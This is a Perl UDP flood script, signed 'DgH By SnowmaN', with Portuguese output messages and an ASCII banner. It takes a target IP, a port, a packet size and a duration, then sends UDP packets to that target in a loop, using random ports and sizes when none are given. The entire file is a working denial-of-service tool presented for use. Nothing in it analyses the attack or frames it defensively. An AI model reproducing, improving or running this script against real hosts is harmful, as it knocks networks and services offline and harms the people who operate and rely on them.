#!/usr/bin/perl

##
# DgH By SnowmaN<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "NÃO FOI POSSIVEL ACHAR O HOSTNAME: $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;
 █▀▄▀█ █▀▀█ █▀▀█ █▀▀█ █▀▀▀█ █▀▀▀█   █▀▀█ █░░░ █▀▀▀ █░░▒█
 █▒█▒█ █▄▄█ █▄▄▀ █░░░ █░░▒█ ▀▀▀▄▄   █░░░ █░░░ █▀▀▀ █▄▄▄█
 █░░▒█ █░▒█ █░▒█ █▄▄█ █▄▄▄█ █▄▄▄█   █▄▄█ █▄▄█ █▄▄▄ ░▒█░░
EOTEXT

print "IP:$ip\nPORTA:" . ($port ? $port : "ALEATORIA") . "\nTAMANHO:" . ($size ? "$size-BYTES" : "DESCONECTAR :)") . "\nTEMPO:" . ($time ? "$time SEGUNDOS" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}